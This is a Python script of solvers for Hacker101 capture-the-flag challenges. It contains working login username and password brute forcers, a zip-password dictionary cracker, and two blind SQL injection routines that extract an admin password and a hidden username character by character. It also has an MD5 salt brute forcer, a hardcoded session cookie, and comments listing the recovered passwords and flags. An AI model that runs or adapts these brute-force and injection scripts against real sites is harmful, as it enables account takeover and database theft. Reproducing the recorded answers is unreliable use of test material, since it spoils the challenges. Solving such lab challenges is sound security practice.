import requests
import itertools

url = "https://1195c61969e46a0503d1fbae1c5e8b56.ctf.hacker101.com/secure-login/"
wordlist_path = "multiplesources-users-fabian-fingerle.de.txt"

# Use a session for speed
session = requests.Session()

def findUsername():
    print(f"--- Hunting for valid usernames ---")

    with open(wordlist_path, 'r', errors='ignore') as f:
        for count, line in enumerate(f, 1):
            username = line.strip()
            if not username: continue
            
            if count % 500 == 0:
                print(f"[*] Checked {count} names...")

            data = {"username": username, "password": "any_fake_password"}
            
            try:
                r = session.post(url, data=data, timeout=5)
                
                # Check for if "Invalid Username is not in the text"
                if "Invalid Username" not in r.text:
                    print(f"\nPossible valid username found: {username}")
                    
                    # Check what the new message is
                    if "Invalid Password" in r.text:
                        print("Status: Username exists, but password was wrong.")
                    else:
                        print("Status: Unexpected response! Check the page manually.")
                    
                    # Stop once we find the first valid user
                    break 
                    
            except Exception as e:
                print(f"Error on {username}: {e}")
                break

def findPassword(start_from=1):
    print(f"--- Hunting for valid passwords ---")

    with open(wordlist_path, 'r', errors='ignore') as f:
        # Skip directly to the (start_from)th line; enumerate counts from start_from
        for count, line in enumerate(itertools.islice(f, start_from - 1, None), start_from):
            password = line.strip()
            if not password:
                continue
            
            if count % 500 == 0:
                print(f"[*] Checked {count} passwords...")
            
            data = {"username": "access", "password": password}

            try:
                r = session.post(url, data=data, timeout=5)

                if "Invalid Password" not in r.text:
                    print(f"\nPossible valid password found: {password}")
                    # Stop once we find the first valid user
                    break 
                    
            except Exception as e: 
                print(f"Error on {password}: {e}")
                break

def crackZipFile():
    import zipfile
    import zlib

    zip_file = "my_secure_files_not_for_you.zip"
    wordlist = "multiplesources-users-fabian-fingerle.de.txt"

    with zipfile.ZipFile(zip_file) as zf:
        # Test against the first file in the archive to avoid extracting everything
        test_file = zf.namelist()[0]
        with open(wordlist, 'rb') as f:
            for count, line in enumerate(f):
                password = line.strip()
                if count % 1000 == 0:
                    print(f"[*] Checked {count} passwords...")
                try:
                    zf.read(test_file, pwd=password)
                    print(f"PASSWORD FOUND: {password.decode(errors='ignore')}")
                    break
                except (RuntimeError, zipfile.BadZipFile, zlib.error):
                    continue

def SQLInject():
    import time
    print(f"--- SQL Injection ---")
    targetUrl = 'https://49a8ad689e6e6709fe060d39530c4eca.ctf.hacker101.com/evil-quiz'
    scoreUrl = f"{targetUrl}/score"
    activeCookies = {'quizsession': '60e5a28750d30a647406f7614aa8102f'}

    sessionObject = requests.Session()
    sessionObject.cookies.update(activeCookies)
    sessionObject.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Referer': targetUrl,
        'Origin': targetUrl.split('/evil-quiz')[0]
    })

    # Comprehensive alphabet including symbols
    searchAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./:@~<>?'

    def performAttack(currentPassword):
        index = len(currentPassword) + 1
        for letter in searchAlphabet:
            payload = "InvalidName' UNION SELECT 1,2,3,4 FROM admin WHERE username='admin' AND ORD(SUBSTR(password, %d, 1))='%d" % (index, ord(letter))            
            data = {'name': payload}
            r = requests.post(targetUrl, cookies=activeCookies, data=data)
            r = requests.get(scoreUrl, cookies=activeCookies)
            print(r.text)
            
            if 'There is 1 other' in r.text:
                return currentPassword + letter
                
        return currentPassword

    # Main execution loop
    finalPassword = ''
    while True:
        newPassword = performAttack(finalPassword)
        if newPassword == finalPassword:
            print(f"Password found: '{finalPassword}'")
            break
        finalPassword = newPassword
        print(f"Progress: {finalPassword}")

def flag11Search():
    from bs4 import BeautifulSoup as BSHTML

    start=''
    alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'

    def guess(start):
        for letter in alphabet:
            attempt=start+letter
            url = f'''https://f6c91d9618b548d546d49ffb0df31e53.ctf.hacker101.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
            r = requests.get(url)
            soup = BSHTML(r.text, "html.parser")
            images = soup.findAll('img')
            print(images)
            r = requests.get("https://f6c91d9618b548d546d49ffb0df31e53.ctf.hacker101.com" + images[1]["src"])
            if len(r.text) != 39:
                return attempt
        return start

    updated=guess(start)
    while updated != start:
        start = updated
        updated=guess(start)
        print("nearly there: " + updated)

    print("found: " + updated)

def findSalt():
    import hashlib
    print("--- Finding Salt ---")
    target = "5f2940d65ca4140cc18d0878bc398955"
    base_input = "203.0.113.33"
    wordlist_path = "rockyou.txt"

    # Check integers (common for ports/IDs)
    for i in range(65536):
        salt = str(i)
        if hashlib.md5((base_input + salt).encode()).hexdigest() == target:
            print(f"FOUND SALT: {salt} (appended)")
            return
        if hashlib.md5((salt + base_input).encode()).hexdigest() == target:
            print(f"FOUND SALT: {salt} (prepended)")
            return

    # Check wordlist
    with open(wordlist_path, 'r', errors='ignore') as f:
        for count, line in enumerate(f, 1):
            salt = line.strip()
            if not salt: continue
            if hashlib.md5((base_input + salt).encode()).hexdigest() == target:
                print(f"FOUND SALT: {salt} (appended)")
                return
            if hashlib.md5((salt + base_input).encode()).hexdigest() == target:
                print(f"FOUND SALT: {salt} (prepended)")
                return
    print("Salt not found.")

#findUsername() # username found to be access
#findPassword(start_from=5501) # password found to be computer
# crackZipFile() # password found to be hahahaha
# SQLInject() # password found to be S3creT_p4ssw0rd-$
# flag11Search() # username found to be grinchadmin
# findSalt() # salt found to be mrgrinch463